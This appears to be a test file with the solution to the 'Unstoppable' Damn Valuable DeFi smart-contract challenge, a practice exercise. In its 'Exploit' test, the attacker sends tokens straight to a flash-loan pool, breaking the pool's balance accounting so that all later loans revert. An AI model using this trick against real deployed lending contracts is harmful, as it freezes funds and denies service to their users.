const chai = require("chai");
const waffle = require("ethereum-waffle");
chai.use(waffle.solidity);
const BN = require("bn.js");
// Enable and inject BN dependency - https://www.chaijs.com/plugins/chai-bn/
chai.use(require("chai-bn")(BN));
const expect = chai.expect;

const UnstoppableLenderFactory = artifacts.require("UnstoppableLender");
const DamnValuableTokenFactory = artifacts.require("DamnValuableToken");
const ReceiverContractFactory = artifacts.require("ReceiverUnstoppable");

contract("[Challenge] Unstoppable", (accounts) => {
  let deployer, attacker, someUser;

  // Pool has 1M * 10**18 tokens

  const TOKENS_IN_POOL = web3.utils.toWei("1000000", "ether");
  const INITIAL_ATTACKER_TOKEN_BALANCE = web3.utils.toWei("100", "ether");

  before(async function () {
    this.timeout(2000);
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker, someUser] = accounts;

    this.token = await DamnValuableTokenFactory.new({ from: deployer });
    this.pool = await UnstoppableLenderFactory.new(this.token.address, {
      from: deployer,
    });

    // console.log("accounts:", { accounts, deployer, attacker, someUser });

    await this.token.approve(this.pool.address, TOKENS_IN_POOL);
    await this.pool.depositTokens(TOKENS_IN_POOL);

    await this.token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

    expect(
      await this.token.balanceOf(this.pool.address)
    ).to.be.a.bignumber.equal(TOKENS_IN_POOL);

    expect(await this.token.balanceOf(attacker)).to.be.a.bignumber.equal(
      INITIAL_ATTACKER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    this.receiverContract = await ReceiverContractFactory.new(
      this.pool.address,
      { from: someUser }
    );
    await this.receiverContract.executeFlashLoan(10, { from: someUser });
  });

  it("Exploit", async function () {
    // Sending token directly and not using the pool's deposit function
    // will break the internal accounting.
    await this.token.transfer(this.pool.address, 1, { from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // It is no longer possible to execute flash loans
    await expect(
      this.receiverContract.executeFlashLoan(10, { from: someUser })
    ).to.be.reverted;
  });
});
